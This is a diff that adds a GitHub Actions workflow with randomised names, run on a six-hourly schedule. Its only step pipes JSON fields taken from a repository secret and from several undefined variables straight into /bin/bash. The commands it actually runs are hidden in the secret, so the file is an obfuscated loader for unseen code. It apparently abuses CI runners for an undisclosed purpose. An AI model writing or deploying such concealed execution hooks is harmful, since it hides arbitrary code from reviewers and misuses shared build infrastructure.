@@ -1,0 +1,29 @@
+name: hangyuuinuu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hangyuuinuu
+        env:
+          vawf7: ${{ secrets.vawf7 }}
+        run: |
+          echo $vawf7 | jq -r .opg8151 | /bin/bash
+          echo $znpla26704 | jq -r .t013 | /bin/bash
+          echo $m4801 | jq -r .umq0053 | /bin/bash
+          echo $fj58135 | jq -r .vhzu9768 | /bin/bash
+          echo $nyo6 | jq -r .efyae6 | /bin/bash
+          echo $eci5317 | jq -r .ix84 | /bin/bash
+          echo $fq89 | jq -r .brhd5 | /bin/bash
+          echo $d018 | jq -r .g5210 | /bin/bash
+          echo $whh68 | jq -r .slu31 | /bin/bash
+          echo $b1531 | jq -r .kj533 | /bin/bash
+          echo $iqebn81801 | jq -r .m7 | /bin/bash
+
